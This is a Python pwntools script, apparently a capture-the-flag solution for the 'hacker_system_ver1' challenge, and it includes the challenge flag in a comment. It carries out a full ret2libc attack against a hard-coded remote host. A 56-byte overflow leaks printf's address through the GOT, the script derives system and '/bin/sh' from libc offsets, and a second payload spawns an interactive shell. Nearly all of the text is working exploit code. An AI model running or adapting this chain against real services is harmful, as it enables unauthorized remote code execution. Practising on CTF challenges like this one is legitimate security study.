from pwn import *

context.log_level = 'debug'
context(log_level='debug')

local = 1

if local:
	p = remote('111.230.149.72', 10005)
	elf = ELF('./hacker_system_ver1')
	libc = ELF('./libc32.so')
else:
	p = process('./hacker_system_ver1')
	elf = ELF('./hacker_system_ver1')
	libc = ELF('./libc.so')

def printinfo(length, name):
	p.recvuntil("length:")
	p.sendline(str(length))
	p.recvuntil("name:")
	p.sendline(name)

put_plt = elf.symbols['printf']
put_got = elf.got['printf']
printaddr=0x8048a20
pret=0x08048455

p.recvuntil(">")
p.sendline("2")
payload = "A"*56 + p32(put_plt) + p32(printaddr) + p32(put_got)
printinfo(len(payload) + 1, payload)
p.recvline()
printfaddr = u32(p.recv(4))

system_addr = printfaddr - (libc.symbols['printf'] - libc.symbols['system'])
binsh_addr = printfaddr - (libc.symbols['printf'] - next(libc.search('/bin/sh')))
print "system_addr: ", hex(system_addr)
print "binsh_addr: ", hex(binsh_addr)

payload2 = 'a' * 56 + p32(system_addr) + p32(printaddr) + p32(binsh_addr)
printinfo(len(payload2) + 1, payload2)
p.interactive()
# p.sendline("cat flag")
# p.sendline("cat flag")
# print p.recv()
#hgame{i_forget_to_add_u_to_the_list_QAQ_big_hacker}
